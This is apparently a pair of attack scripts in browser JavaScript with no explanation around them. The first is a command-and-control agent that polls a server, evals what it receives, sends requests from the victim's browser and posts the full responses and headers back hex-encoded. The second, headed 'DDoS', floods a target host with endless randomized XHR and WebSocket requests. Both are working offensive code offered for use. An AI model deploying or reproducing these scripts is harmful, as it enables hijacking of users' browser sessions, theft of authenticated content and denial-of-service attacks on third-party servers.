var sotf_server_url=&#34;127.0.0.1:5006&#34;;
//v1.0.0.0
var pending_requests=0;
var comm;
var vid=0;
var rid=0;
var ie=0;
var poll_sotf;

if(window.XDomainRequest)
{
   ie=1; 
}

poll();

function poll()
{
    if(ie)
    {
       poll_sotf = new XDomainRequest();
       poll_sotf.onload = process_poll_res;
    }
    else
    {
        poll_sotf = new XMLHttpRequest();
        poll_sotf.onreadystatechange = function()
        {
            if(poll_sotf.readyState == 4)
            {
                process_poll_res();
            }   
        }
    }
    if(vid &gt; 0)
    {
        poll_sotf.open(&#34;GET&#34;, &#34;http://&#34; + sotf_server_url + &#34;/poll/&#34; + vid);
    }
    else
    {
        poll_sotf.open(&#34;GET&#34;, &#34;http://&#34; + sotf_server_url + &#34;/poll/&#34;);
    }
    poll_sotf.send();
}
function process_poll_res()
{
    if(poll_sotf.responseText.length &gt; 0)
    {
        if(poll_sotf.responseText.length &gt; 13)
        {
            comm = eval(&#39;(&#39;+poll_sotf.responseText+&#39;)&#39;);//JSON.parse didn&#39;t go down well with IE(security_creds--)
            pending_requests = comm.req.length;
            setTimeout(&#34;exec_sotf_commands()&#34;,1);
        }
        else
        {
            vid = poll_sotf.responseText;
            setTimeout(&#34;poll()&#34;,1);
        }
    }
    else
    {
        setTimeout(&#34;poll()&#34;,1000);
    }
}
function exec_sotf_commands()
{
    if(pending_requests &gt; 0)
    {
	var request_no = comm.req.length - pending_requests;
        var to_website = new XMLHttpRequest();
	var _req = comm.req[request_no];
	pending_requests--;
        if(_req.rid &gt; rid)
        {           
            rid = _req.rid;
            to_website.open(comm.req[request_no].m, decodeFromHex(comm.req[request_no].u));
            to_website.open(_req.m, decodeFromHex(_req.u));
            to_website.onreadystatechange = function()
            {
                if(to_website.readyState == 4)
                {
                    var post_sotf;
                    if(ie)
                    {
                        post_sotf = new XDomainRequest();
                        post_sotf.open(&#34;POST&#34;, &#34;http://&#34; + sotf_server_url + &#34;/push/&#34; + vid + &#34;_&#34; + _req.rid);
                    }
                    else
                    {
                        post_sotf = new XMLHttpRequest();
                        post_sotf.open(&#34;POST&#34;, &#34;http://&#34; + sotf_server_url + &#34;/push/&#34; + vid + &#34;_&#34; + _req.rid);
                        post_sotf.setRequestHeader(&#34;Content-type&#34;, &#34;application/x-www-form-urlencoded&#34;);
                    }
                    var body = vid + &#34;&amp;&#34; + _req.rid + &#34;&amp;&#34; + to_website.status + &#34;&amp;&#34; + encodeToHex(to_website.getAllResponseHeaders()) + &#34;&amp;&#34; + encodeToHex(to_website.responseText);
                    post_sotf.send(body);
                }
            }
            if(_req.ct)
            {
                to_website.setRequestHeader(&#34;Content-Type&#34;, _req.ct);
            }
            if(_req.b.length &gt; 0)
            {
                to_website.send(decodeFromHex(_req.b));
            }
            else
            {
                to_website.send();
            }
        }
        setTimeout(&#34;exec_sotf_commands()&#34;,1);
    }
    else
    {
        setTimeout(&#34;poll()&#34;,1);
    }
}

function encodeToHex(input){
    var output=&#34;x&#34;;
    var length = input.length;
    var count=0;
    var hex;
    while(count &lt; length){
        hex = input.charCodeAt(count).toString(16);
        if(count == (length-1))
        {
            output = output + hex;
        }
        else
        {
            output = output + hex + &#34;x&#34;;
        }
        count++;
    }
    return output;
}

function decodeFromHex(input){
    var output=&#34;&#34;;
    var count = input.length;
    var array = input.split(&#39;x&#39;);
    for(var ele in array)
    {
        if(array[ele].length &gt; 0)
        {
            output += String.fromCharCode(&#34;0x&#34;+ array[ele]);
        }
    }
    return output;
}


 
DDoS


var target = &#39;www.server.com&#39;;
var thread_count = 1;
var scan_counter = 0;
var resp_size_counter = 0;
var Sys = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
var xhr; 
if (!Sys.ie){
  var i = 0;
  while(i&lt;thread_count){
    while_loop_cor();
    i++;
  }
}else{
  var i = 0;
  while(i&lt;thread_count){
    while_loop_ie();i++;
  }
}
if (!Sys.ie){
  xhr = new XMLHttpRequest();
  xhr.onreadystatechange = processResp;
}else{
  xdr = new XDomainRequest();
  xdr.timeout = 1000;
}

function while_loop_cor(){
  try{
    ws = new WebSocket(&#39;ws://&#39; + target);
    scan_counter = scan_counter+1;
    xhr = new XMLHttpRequest();
    var furl=&#39;http://&#39; + target + &#39;?xb0z=&#39; + Math.floor(Math.random()*10000000000);
    xhr.open(&#39;GET&#39;, furl);
    xhr.onreadystatechange = function(){
      if (xhr.readyState==4){
        resp_size_counter = resp_size_counter+xhr.responseText.length;
      }
    };
    xhr.onerror = function(e){} 
    xhr.send(100);
    setTimeout(&#34;while_loop_cor()&#34;,0);
  }
  catch(err){return;}
} 

function while_loop_ie(){
  try{
    scan_counter = scan_counter+1;
    xdr = new XDomainRequest();
    xdr.open(&#39;get&#39;, &#39;http://&#39; + target + &#39;:80&#39;);
    xdr.send();
    setTimeout(&#39;while_loop_ie()&#39;,0);
  }catch(err){
    return;
  }
}

function processResp(){
  if (xmlhttp.readyState==4){}
}

